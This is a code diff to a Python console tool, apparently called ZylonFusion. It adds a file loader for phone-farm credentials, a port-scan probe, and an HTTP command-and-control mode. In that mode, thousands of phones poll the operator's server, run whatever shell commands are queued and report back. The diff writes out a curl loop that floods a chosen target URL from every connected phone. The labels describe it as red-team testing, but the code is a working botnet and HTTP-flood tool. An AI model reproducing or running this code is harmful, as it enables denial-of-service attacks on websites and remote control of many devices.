@@ -2860,6 +2860,15 @@ class ZylonFusion:
                 self.battle = BattleEngine()
                 console.print("[green][+] Battle engine reset[/green]")
             
+            elif cmd == 'load':
+                self._battle_load_file()
+            
+            elif cmd == 'probe':
+                self._battle_probe()
+            
+            elif cmd == 'c2':
+                self._battle_c2_mode()
+            
             else:
                 console.print(f"[bold red][!] Unknown command: {cmd}. Type 'help'[/bold red]")
     
@@ -2875,7 +2884,9 @@ class ZylonFusion:
         commands = [
             ("add", "Add single agent (IP:port user pass)"),
             ("addbulk", "Add multiple agents from list"),
+            ("load", "Load agents from file (4K+ phones)"),
             ("connect", "Connect to all registered agents"),
+            ("probe", "Diagnose connection issues (port scan)"),
             ("status", "Show agent connection status"),
             ("target", "Set battle target (YOUR server URL)"),
             ("recon", "Phase 1: Light probing (5 reqs/agent)"),
@@ -2883,6 +2894,7 @@ class ZylonFusion:
             ("slowloris", "Phase 3: Slow connection test"),
             ("slowpost", "Phase 4: Slow body upload test"),
             ("fullbattle", "Run all phases sequentially"),
+            ("c2", "HTTP C2 mode (phones behind NAT/cellular)"),
             ("dashboard", "Show battle statistics"),
             ("stop", "EMERGENCY STOP all agents"),
             ("clear", "Reset battle engine"),
@@ -3088,6 +3100,168 @@ class ZylonFusion:
         console.print(f"  [cyan]- Deploy WAF with rate limiting (ModSecurity)[/cyan]")
         console.print(f"  [cyan]- Use CDN (Cloudflare) for DDoS absorption[/cyan]")
         console.print(f"  [cyan]- Implement JS Challenge for suspicious traffic[/cyan]")
+    
+    def _battle_load_file(self):
+        """Load agents from a creds file (for 4K+ phone farms)"""
+        console.print("\n[bold cyan][*] Load Agents from File[/bold cyan]")
+        console.print("[dim]   Format: IP:PORT:USER:PASS (one per line)[/dim]")
+        console.print("[dim]   Shortcut: IP:PORT or just IP[/dim]")
+        
+        filepath = Prompt.ask("[bold yellow]   File path[/bold yellow]")
+        success, msg = self.battle.load_file(filepath)
+        if success:
+            console.print(f"[green][+] {msg}[/green]")
+        else:
+            console.print(f"[bold red][!] {msg}[/bold red]")
+    
+    def _battle_probe(self):
+        """Probe a phone to diagnose connection issues"""
+        console.print("\n[bold cyan][*] Probe Agent - Diagnose Connection[/bold cyan]")
+        
+        host = Prompt.ask("[bold yellow]   Phone IP[/bold yellow]")
+        results = self.battle.probe_agent(host)
+        
+        # Show port scan results
+        probe_table = Table(title=f"Probe Results: {host}", box=box.ROUNDED, border_style="cyan")
+        probe_table.add_column("Port", style="yellow")
+        probe_table.add_column("Status", style="white")
+        probe_table.add_column("Detail", style="cyan")
+        
+        for port, info in results['ports'].items():
+            status = "[green]OPEN[/green]" if info['open'] else "[red]CLOSED[/red]"
+            probe_table.add_row(str(port), status, info['detail'])
+        
+        console.print(probe_table)
+        
+        if results['recommendation']:
+            console.print(f"\n[bold yellow]Recommendation:[/bold yellow] {results['recommendation']}")
+    
+    def _battle_c2_mode(self):
+        """HTTP C2 mode - for phones behind NAT/carrier firewall"""
+        from core.http_c2 import HTTPC2Server
+        
+        console.print("\n[bold cyan][*] HTTP C2 Mode - Phones Behind NAT/Cellular[/bold cyan]")
+        console.print(Panel(
+            "[bold white]   HTTP C2 ARCHITECTURE[/bold white]\n"
+            "[bold yellow]   Phones connect OUT to your server[/bold yellow]\n"
+            "[dim white]   Works through carrier NAT, any firewall[/dim white]\n\n"
+            "[bold]HOW IT WORKS:[/bold]\n"
+            "1. ZYLON starts an HTTP server on YOUR phone\n"
+            "2. Farm phones run a tiny bash script (curl-based)\n"
+            "3. Phones poll for commands every 3 seconds\n"
+            "4. ZYLON queues curl commands for all phones\n"
+            "5. Phones execute and report results\n\n"
+            "[bold green]NO TELNET/SSH NEEDED![/bold green]\n"
+            "[bold green]NO PYTHON NEEDED ON FARM PHONES![/bold green]\n"
+            "[bold green]JUST CURL (already in Termux)![/bold green]",
+            border_style="bold cyan",
+            box=box.HEAVY
+        ))
+        
+        port = IntPrompt.ask("[bold yellow]   C2 Server Port[/bold yellow]", default=9999)
+        
+        c2 = HTTPC2Server(port=port)
+        success, msg = c2.start()
+        
+        if success:
+            console.print(f"[green][+] {msg}[/green]")
+            
+            # Generate agent script
+            server_url = f"http://YOUR_PHONE_IP:{port}"
+            script = c2.get_agent_script(server_url)
+            script_path = os.path.join(os.path.dirname(__file__), 'zylon_agent.sh')
+            try:
+                with open(script_path, 'w') as f:
+                    f.write(script)
+                console.print(f"[green][+] Agent script saved: zylon_agent.sh[/green]")
+            except Exception:
+                console.print("[yellow][!] Could not save agent script[/yellow]")
+            
+            console.print(f"\n[bold yellow]NEXT STEPS:[/bold yellow]")
+            console.print(f"  1. Find YOUR phone IP: ifconfig")
+            console.print(f"  2. Edit zylon_agent.sh: change YOUR_PHONE_IP to your actual IP")
+            console.print(f"  3. Copy zylon_agent.sh to each farm phone")
+            console.print(f"  4. On each phone: chmod +x zylon_agent.sh && ./zylon_agent.sh")
+            console.print(f"  5. Come back here and use 'target' + 'flood' commands")
+            
+            # Set target if already set
+            if self.battle.target:
+                c2.target = self.battle.target
+                console.print(f"\n[cyan][*] Target already set: {self.battle.target}[/cyan]")
+            
+            # C2 interactive loop
+            console.print(f"\n[bold cyan]C2 Server running. Type commands below:[/bold cyan]")
+            while True:
+                console.print(f"\n[bold magenta]C2[/bold magenta] [bold yellow]>[/bold yellow] ", end="")
+                try:
+                    c2_cmd = input().strip().lower()
+                except (KeyboardInterrupt, EOFError):
+                    c2.stop()
+                    break
+                
+                if c2_cmd in ['exit', 'quit', 'q', 'back']:
+                    c2.stop()
+                    console.print("[yellow][*] C2 Server stopped[/yellow]")
+                    break
+                elif c2_cmd == 'phones':
+                    console.print(f"[cyan]Phones online: {c2.get_phone_count()}[/cyan]")
+                    for pid, status in c2.phone_status.items():
+                        console.print(f"  {pid}: last seen {status.get('last_seen', '?')}")
+                elif c2_cmd == 'target':
+                    target = Prompt.ask("[bold yellow]   Target URL[/bold yellow]")
+                    c2.target = target
+                    self.battle.target = target
+                    console.print(f"[green][+] Target set: {target}[/green]")
+                elif c2_cmd == 'flood':
+                    if not c2.target:
+                        console.print("[red][!] Set target first: target[/red]")
+                        continue
+                    count = IntPrompt.ask("[bold yellow]   Requests per phone[/bold yellow]", default=50)
+                    cmd = (
+                        f"for i in $(seq 1 {count}); do "
+                        f"curl -s -o /dev/null -w '%{{http_code}} ' "
+                        f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
+                        f"'{c2.target}?q=$RANDOM' --max-time 5 2>/dev/null; "
+                        f"done; echo ''"
+                    )
+                    n = c2.queue_command(cmd)
+                    console.print(f"[green][+] Flood command queued for {n} phones[/green]")
+                elif c2_cmd == 'recon':
+                    if not c2.target:
+                        console.print("[red][!] Set target first: target[/red]")
+                        continue
+                    cmd = (
+                        f"for i in $(seq 1 5); do "
+                        f"curl -s -o /dev/null -w '%{{http_code}} ' "
+                        f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
+                        f"'{c2.target}?zylon=$RANDOM' --max-time 5 2>/dev/null; "
+                        f"sleep 0.5; done; echo ''"
+                    )
+                    n = c2.queue_command(cmd)
+                    console.print(f"[green][+] Recon command queued for {n} phones[/green]")
+                elif c2_cmd == 'stop':
+                    c2.queue_command("echo STOP")
+                    console.print("[yellow][+] Stop signal sent to all phones[/yellow]")
+                elif c2_cmd == 'script':
+                    console.print("\n[bold cyan]Agent Script (copy to each phone):[/bold cyan]")
+                    console.print(c2.get_agent_script(f"http://YOUR_PHONE_IP:{port}"))
+                elif c2_cmd == 'help':
+                    console.print(Panel(
+                        "[bold]C2 Commands:[/bold]\n"
+                        "  phones  - Show connected phones\n"
+                        "  target  - Set target URL\n"
+                        "  recon   - Light probe (5 reqs/phone)\n"
+                        "  flood   - HTTP flood (50 reqs/phone)\n"
+                        "  stop    - Stop all phones\n"
+                        "  script  - Show agent script\n"
+                        "  help    - Show this help\n"
+                        "  exit    - Stop C2 server",
+                        border_style="cyan"
+                    ))
+                else:
+                    console.print("[yellow]Unknown command. Type 'help'[/yellow]")
+        else:
+            console.print(f"[bold red][!] {msg}[/bold red]")
     
     def _battle_emergency_stop(self):
         """Emergency stop all agents"""
